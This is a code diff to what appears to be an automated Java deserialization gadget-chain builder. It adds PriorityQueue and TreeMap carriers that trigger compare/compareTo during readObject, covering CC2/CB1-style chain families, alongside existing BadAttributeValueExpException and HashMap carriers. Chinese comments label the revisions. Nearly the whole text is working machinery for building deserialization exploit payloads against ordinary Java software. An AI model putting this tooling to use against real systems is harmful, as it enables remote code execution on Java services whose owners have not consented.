@@ -142,6 +142,39 @@ public class CB{n} {{
                             }} catch (Throwable ig) {{}}
                         }}
                         b = m;
+                    }} else if (carrier.startsWith("PRIORITY_QUEUE")) {{
+                        // R53(致命盲区修复): PriorityQueue 载体 — readObject
+                        // heapify 触发 compare()/compareTo()。覆盖 CC2/CB1 型链族。
+                        java.util.PriorityQueue<Object> pq;
+                        if (bridge instanceof java.util.Comparator) {{
+                            pq = new java.util.PriorityQueue<>(2,
+                                (java.util.Comparator) bridge);
+                            pq.add(recv);
+                            pq.add(recv);
+                        }} else if (bridge instanceof java.lang.Comparable) {{
+                            pq = new java.util.PriorityQueue<>();
+                            pq.add(bridge);
+                            pq.add(bridge);
+                        }} else {{
+                            System.out.println("R NOFIT"); continue;
+                        }}
+                        b = pq;
+                    }} else if (carrier.startsWith("TREEMAP")) {{
+                        // R53: TreeMap 载体 — readObject put 触发 compare/compareTo
+                        java.util.TreeMap<Object, Object> tm;
+                        if (bridge instanceof java.util.Comparator) {{
+                            tm = new java.util.TreeMap<>(
+                                (java.util.Comparator) bridge);
+                            tm.put(recv, "v1");
+                            tm.put(recv, "v2");
+                        }} else if (bridge instanceof java.lang.Comparable) {{
+                            tm = new java.util.TreeMap<>();
+                            tm.put(bridge, "v1");
+                            tm.put(bridge, "v2");
+                        }} else {{
+                            System.out.println("R NOFIT"); continue;
+                        }}
+                        b = tm;
                     }} else {{
                         javax.management.BadAttributeValueExpException be =
                             new javax.management.BadAttributeValueExpException(null);
@@ -839,9 +872,16 @@ class JGDChainCompleteAgent:
         jdks = ma.find_jdks()
         jdk17 = jdks.get(17)
         if needs <= 11 or not jdk17:
-            carriers, jbin = ("BAVE", "HASHMAP"), jdk11_java()
+            base, jbin = ("BAVE", "HASHMAP"), jdk11_java()
         else:
-            carriers, jbin = ("HASHMAP",), str(Path(jdk17) / "bin" / "java")
+            base, jbin = ("HASHMAP",), str(Path(jdk17) / "bin" / "java")
+        # R53: compare/compareTo 桥补 PriorityQueue
+        trig_set = {t.get("trigger", "") for t in
+                    bridge.get("evidence", {}).get("bridge_detail", [])}
+        if "compareTo" in trig_set or "compare" in trig_set:
+            carriers = tuple(list(base) + ["PRIORITY_QUEUE"])
+        else:
+            carriers = base
         best: dict | None = None
         for carrier in carriers:
             src = CHAIN2.format(n=n, bcls=bridge["cls"],
@@ -1161,12 +1201,21 @@ class JGDChainCompleteAgent:
             needs = b.get("evidence", {}).get("needs_jdk", 11)
             fwd = next((t["field"] for t in
                         b.get("evidence", {}).get("bridge_detail", [])), "-")
-            # R27/R47: 载体集 — JDK11 双载体(含 equals 载体), JDK17 HashMap 家族
+            # R27/R47/R53: 载体集 — 覆盖全部经典触发路径
+            # BAVE=toString, HashMap=hashCode, HASHMAP_EQ=equals,
+            # PriorityQueue=compare/compareTo, TreeMap=compare/compareTo
             if needs <= 11 or not jdk17:
-                carriers, jbin = ("BAVE", "HASHMAP", "HASHMAP_EQ"), jdk11_java()
+                base = ["BAVE", "HASHMAP", "HASHMAP_EQ"]
+                jbin = jdk11_java()
             else:
-                carriers, jbin = ("HASHMAP", "HASHMAP_EQ"), str(
-                    Path(jdk17) / "bin" / "java")
+                base = ["HASHMAP", "HASHMAP_EQ"]
+                jbin = str(Path(jdk17) / "bin" / "java")
+            trig_set = {t.get("trigger", "") for t in
+                        b.get("evidence", {}).get("bridge_detail", [])}
+            if "compareTo" in trig_set or "compare" in trig_set:
+                carriers = tuple(base + ["PRIORITY_QUEUE", "TREEMAP"])
+            else:
+                carriers = tuple(base)
             for carrier in carriers:
                 tasks.append((b, [r["cls"] for r in fresh], carrier, jars,
                               jbin, fwd))
